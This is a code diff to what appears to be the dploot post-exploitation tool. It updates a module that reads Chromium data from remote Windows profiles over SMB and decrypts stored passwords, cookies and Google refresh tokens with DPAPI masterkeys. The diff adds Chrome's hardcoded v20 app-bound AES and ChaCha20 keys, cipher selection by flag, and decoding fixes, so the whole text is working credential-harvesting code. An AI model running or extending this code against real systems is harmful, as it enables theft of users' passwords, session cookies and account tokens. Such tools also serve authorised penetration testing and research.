@@ -1,5 +1,5 @@
 import base64
-from Cryptodome.Cipher import AES
+from Cryptodome.Cipher import AES, ChaCha20_Poly1305
 from binascii import hexlify
 import json
 import logging
@@ -9,7 +9,6 @@ from typing import Any, List, Tuple, Callable
 from impacket.structure import Structure
 
 
-from dploot.lib.consts import FALSE_POSITIVES
 from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
 from dploot.lib.smb import DPLootSMBConnection
 from dploot.lib.target import Target
@@ -47,12 +46,20 @@ class AppBoundKey(Structure):
             return self._key
         if len(self["Key"]) == 32:
             self._key = self["Key"]
-        else: # from https://gist.github.com/thewh1teagle/d0bbc6bc678812e39cba74e1d407e5c7
-            key = base64.b64decode("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
+        else: # from https://github.com/runassu/chrome_v20_decryption/blob/main/decrypt_chrome_v20_cookie.py
+            aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
+            chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
+            flag = self["Key"][0]
             iv = self["Key"][1:13]
             encrypted_text = self["Key"][13:45]
-            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
-            self._key = cipher.decrypt(ciphertext=encrypted_text)
+            if flag == 1:
+                cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
+                self._key = cipher.decrypt(ciphertext=encrypted_text)
+            elif flag == 2:
+                cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=iv)
+                self._key = cipher.decrypt(ciphertext=encrypted_text)
+            else:
+                raise ValueError(f"Unsupported flag: {flag}")
         return self._key
     
 @dataclass
@@ -165,7 +172,7 @@ class BrowserTriage(Triage):
         conn: DPLootSMBConnection,
         masterkeys: List[Masterkey],
         per_secret_callback: Callable = None,
-        false_positive: List[str] = FALSE_POSITIVES,
+        false_positive: List[str] | None = None,
     ) -> None:
         super().__init__(
             target, 
@@ -235,35 +242,40 @@ class BrowserTriage(Triage):
                     f"Found {browser.upper()} AppData files for user {user}"
                 )
                 aesStateKey_json = json.loads(aesStateKey_bytes)
-                profiles = aesStateKey_json['profile']['profiles_order']
-                blob = base64.b64decode(aesStateKey_json["os_crypt"]["encrypted_key"])
-                if blob[:5] == b"DPAPI":
-                    dpapi_blob = blob[5:]
-                    masterkey = find_masterkey_for_blob(
-                        dpapi_blob, masterkeys=self.masterkeys
-                    )
-                    if masterkey is not None:
-                        aeskey = decrypt_blob(
-                            blob_bytes=dpapi_blob, masterkey=masterkey
-                        )
-                
-                if "app_bound_encrypted_key" in aesStateKey_json["os_crypt"]:
-                    app_bound_blob = base64.b64decode(aesStateKey_json["os_crypt"]["app_bound_encrypted_key"])
-                    dpapi_blob = app_bound_blob[4:] # Trim off APPB
-                    masterkey = find_masterkey_for_blob(
+                try:
+                    blob = base64.b64decode(aesStateKey_json["os_crypt"]["encrypted_key"])
+                    if blob[:5] == b"DPAPI":
+                        dpapi_blob = blob[5:]
+                        masterkey = find_masterkey_for_blob(
                             dpapi_blob, masterkeys=self.masterkeys
                         )
-                    if masterkey is not None:
-                        intermediate_key = decrypt_blob(
-                            blob_bytes=dpapi_blob, masterkey=masterkey
-                        )
+                        if masterkey is not None:
+                            aeskey = decrypt_blob(
+                                blob_bytes=dpapi_blob, masterkey=masterkey
+                            )
+
+                    if "app_bound_encrypted_key" in aesStateKey_json["os_crypt"]:
+                        app_bound_blob = base64.b64decode(aesStateKey_json["os_crypt"]["app_bound_encrypted_key"])
+                        dpapi_blob = app_bound_blob[4:] # Trim off APPB
                         masterkey = find_masterkey_for_blob(
-                            intermediate_key, masterkeys=self.masterkeys
-                        )
-                        if masterkey:
-                            app_bound_key = AppBoundKey(decrypt_blob(
-                                blob_bytes=intermediate_key, masterkey=masterkey
-                            )).key
+                                dpapi_blob, masterkeys=self.masterkeys
+                            )
+                        if masterkey is not None:
+                            intermediate_key = decrypt_blob(
+                                blob_bytes=dpapi_blob, masterkey=masterkey
+                            )
+                            masterkey = find_masterkey_for_blob(
+                                intermediate_key, masterkeys=self.masterkeys
+                            )
+                            if masterkey:
+                                app_bound_key = AppBoundKey(decrypt_blob(
+                                    blob_bytes=intermediate_key, masterkey=masterkey
+                                )).key
+                    profiles = aesStateKey_json['profile']['profiles_order']
+                except KeyError as e:
+                    logging.debug(f"Key not found! {repr(e)}")
+                    # logging.debug(f"{aesStateKey_json=}")
+
             for profile in profiles:
                 loginData_bytes = self.conn.readFile(
                     shareName=self.share,
@@ -289,14 +301,14 @@ class BrowserTriage(Triage):
                         for url, username, encrypted_password in lines:
                             password = None
                             try:
-                                if encrypted_password[:3] == "v20":
+                                if encrypted_password[:3] == b"v20":
                                     password = decrypt_chrome_password(
                                     encrypted_password, app_bound_key
-                                    )
+                                    ).decode("utf-8")
                                 else:
                                     password = decrypt_chrome_password(
                                     encrypted_password, aeskey
-                                    )
+                                    ).decode("utf-8")
                             except Exception as e:
                                 logging.debug(f"Could not decrypt chrome cookie: {e}")
                             login_data_decrypted = LoginData(
@@ -347,11 +359,11 @@ class BrowserTriage(Triage):
                                         if encrypted_cookie[:3] == b"v20":
                                             decrypted_cookie_value = decrypt_chrome_password(
                                             encrypted_cookie, app_bound_key
-                                            )
+                                            )[32:].decode("utf-8")
                                         else:
                                             decrypted_cookie_value = decrypt_chrome_password(
                                             encrypted_cookie, aeskey
-                                            )
+                                            ).decode("utf-8")
                                     except Exception as e:
                                         logging.debug(f"Could not decrypt chrome cookie: {e}")
                                     cookie = Cookie(
@@ -391,7 +403,7 @@ class BrowserTriage(Triage):
                     lines = query.fetchall()
                     if len(lines) > 0:
                         for service, encrypted_grt in lines:
-                            token = decrypt_chrome_password(encrypted_grt, aeskey)
+                            token = decrypt_chrome_password(encrypted_grt, aeskey).decode("utf-8")
                             google_refresh_token = GoogleRefreshToken(
                                 winuser=user, browser=browser, service=service, token=token
                             )
